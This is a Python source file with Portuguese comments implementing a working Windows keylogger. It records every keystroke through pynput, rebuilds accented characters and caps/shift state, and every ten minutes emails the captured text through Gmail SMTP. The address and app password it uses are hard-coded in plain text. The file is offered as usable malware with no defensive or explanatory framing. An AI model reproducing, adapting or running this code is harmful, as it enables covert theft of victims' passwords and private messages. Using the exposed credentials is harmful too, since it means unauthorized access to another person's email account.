# -*- coding: utf-8 -*-
from pynput.keyboard import Key, Listener
import smtplib
import email.message
import schedule
import time
import threading
import ctypes
import datetime

teclas_nao_interferentes = [
    'Key.tab',                  # Tecla Tab
    'Key.caps_lock',            # Caps Lock
    'Key.shift',                # Tecla Shift
    'Key.shift_l',              # Shift esquerdo
    'Key.shift_r',              # Shift direito
    'Key.alt_gr',               # Alt gr
    'Key.media_next',           # Tecla de passar
    'Key.media_play_pause',     # Tecla de dar play
    'Key.media_previous',       # Tecla de Reproduzir
    'Key.media_volume_down',    # Abaixar Volume
    'Key.media_volume_up',      # Aumenta Volume
    'Key.media_volume_mute',    # Tecla para Mutar som     
]

insert = ['Key.insert']
delete = ['Key.delete']
menu = ['Key.menu']
scroll_lock = ['Key.scroll_lock']
page_up = ['Key.page_up']
page_dn = ['Key.page_down']
home = ['Key.home']
end = ['Key.end']
esc = ['Key.esc']
num_lock = ['Key.num_lock']
alt = ['Key.alt', 'Key.alt_l', 'Key.alt_r']
win = ['Key.cmd', 'Key.cmd_l', 'Key.cmd_r']
ctrl = ['Key.ctrl_l', 'Key.ctrl_r', 'Key.ctrl']
fs = ['Key.f1', 'Key.f2', 'Key.f3', 'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7', 'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12']
acentos = ["['´']", "['`']", "['^']", "['~']", "['¨']", '^', '¨', '´', '~', '`', '\u0301' ,'\u0303' , '\u0302', '\u0300', '\u0308']
recebe_acento = ''
vogais = ['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']
vogais_acento = ['á', 'é', 'í', 'ó', 'ú', 'à', 'è', 'ì', 'ò', 'ù', 'â', 'ê', 'î',
'ô', 'û', 'ã', 'ẽ', 'ĩ', 'õ', 'ũ', 'ä', 'ë', 'ï', 'ö', 'ü', 
'Á', 'É', 'Í', 'Ó', 'Ú', 'À', 'È', 'Ì', 'Ò', 'Ù', 'Â', 'Ê', 'Î',
 'Ô', 'Û', 'Ã', 'Ẽ', 'Ĩ', 'Õ', 'Ũ', 'Ä', 'Ë', 'Ï', 'Ö', 'Ü']
consoantes = ['b', 'c', 'ç', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z']
duplicidade = ''
banco = []

def tec(key): # Função para pegar as informações do teclado
    global recebe_acento
    global duplicidade
    global banco
    texto = ''
    var = ''
    if key == Key.space or key == Key.enter: # Garante o espaço 
        texto += ' '
    elif str(key) in teclas_nao_interferentes:
        return
    elif str(key) in insert:
        key = '{Insert}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in delete:
        key = '{Delete}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in scroll_lock:
        key = '{Scroll Lock}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in menu:
        key = '{Menu}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in win:
        key = '{Windows}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in esc:
        key = '{Esc}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in home:
        key = '{Home}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in page_up:
        key = '{Page_up}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in page_dn:
        key = '{Page_Dn}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in ctrl:
        key = '{Ctrl}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var  
    elif str(key) in end:
        key = '{End}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var 
    elif str(key) in num_lock:
        key = '{Num Lock}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var  
    elif str(key) in alt:
        key = '{Alt}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var          
    elif str(key) in fs:
        if str(key) == 'Key.f1':
            key = '{f1}'
        if str(key) == 'Key.f2':
            key = '{f2}'
        if str(key) == 'Key.f3':
            key = '{f3}'
        if str(key) == 'Key.f4':
            key = '{f4}'
        if str(key) == 'Key.f5':
            key = '{f5}'
        if str(key) == 'Key.f6':
            key = '{f6}'
        if str(key) == 'Key.f7':
            key = '{f7}'
        if str(key) == 'Key.f8':
            key = '{f8}'
        if str(key) == 'Key.f9':
            key = '{f9}'
        if str(key) == 'Key.f10':
            key = '{f10}'
        if str(key) == 'Key.f11':
            key = '{f11}'
        if str(key) == 'Key.f12':
            key = '{f12}'
        var = f'{key}' # Passa as letras pra uma variável
        texto += var        
    elif key == Key.left or key == Key.right or key == Key.up or key == Key.down:
        if key == Key.left:
            key = str('{Esquerda}')
        if key == Key.right:
            key = str('{Direita}')
        if key == Key.up:
            key = str('{Acima}')
        if key == Key.down:
            key = str('{Abaixo}')
        var = f'{key}' # Passa as letras pra uma variável
        texto += var
    elif str(key) in acentos:
        if str(key) == "['´']":
            texto = ''
            recebe_acento = '´'
        if str(key) == "['`']":
            texto = ''
            recebe_acento = '`'
        if str(key) == "['^']":
            texto = ''
            recebe_acento = '^'
        if str(key) == "['~']":
            texto = ''
            recebe_acento = '~'
        if str(key) == "['¨']":
            texto = ''
            recebe_acento = '¨'
        duplicidade += recebe_acento 
    elif key == Key.backspace:
        z = ''
        for q in banco:
            z += q
        if z == '':
            return
        banco.pop()
        banco = list(filter(None, banco))
        return

    elif key == Key.ctrl_l or key == Key.ctrl_r: # Ignora completamente o ctrl
         return
    else:
        caps = ctypes.windll.user32.GetKeyState(0x14)
        shift = ctypes.windll.user32.GetKeyState(0x10)
        if caps == 1:
            var = f'{key}' # Passa as letras pra uma variável
            var = var[1:-1]
            if shift & 0x8000:
                texto += var.lower()
            else:
                texto += var.upper()
        else:    
            var = f'{key}' # Passa as letras pra uma variável
            var = var[1:-1]
            texto += var
    if recebe_acento in acentos and str(texto) in vogais:
        if recebe_acento == '´':
            acento_agudo = '\u0301'
            texto = texto + acento_agudo  
        if recebe_acento == '~':
            acento_til = '\u0303'
            texto = texto + acento_til
        if recebe_acento == '^':
            acento_chapeu = '\u0302'
            texto = texto + acento_chapeu
        if recebe_acento == '`':
            acento_crase = '\u0300'
            texto = texto + acento_crase
        if recebe_acento == '¨':
            acento_trema = '\u0308'
            texto = texto + acento_trema       
        recebe_acento = ''
        duplicidade = ''
    elif recebe_acento in acentos and str(texto) in consoantes:
        texto = recebe_acento + texto
        recebe_acento = ''
        duplicidade = ''
    if len(duplicidade) > 1:
        texto += duplicidade
        duplicidade = ''
    if recebe_acento in acentos and duplicidade != '':
        return
    banco.append(texto)
    print(banco)

def enviar_email():
    if banco == []:
        return  
    data_hora_atual = datetime.datetime.now() # Obtém a data e hora atual
    formato = "%Y-%m-%d %H:%M:%S"  # Por exemplo: 2023-09-23 14:30:00
    data_hora_formatada = data_hora_atual.strftime(formato)
    y = ''
    for x in banco:
        y += x
    corpo_email = y
    msg = email.message.Message()
    msg['Subject'] = f"{data_hora_formatada}"
    msg['From'] = 'santosbrunoph7@gmail.com'
    msg['To'] = 'santosbrunoph7@gmail.com'
    password = 'fxvkkygugrvkbeig' 
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    banco.clear()


# Função para agendar o envio de email a cada 600 segundos
def agendar_envio_email():
    schedule.every(600).seconds.do(enviar_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

# Crie uma thread para a função agendar_envio_email
thread_email = threading.Thread(target=agendar_envio_email)

# Inicie a thread do email
thread_email.start()


with Listener (on_press=tec) as monitor:
    monitor.join()
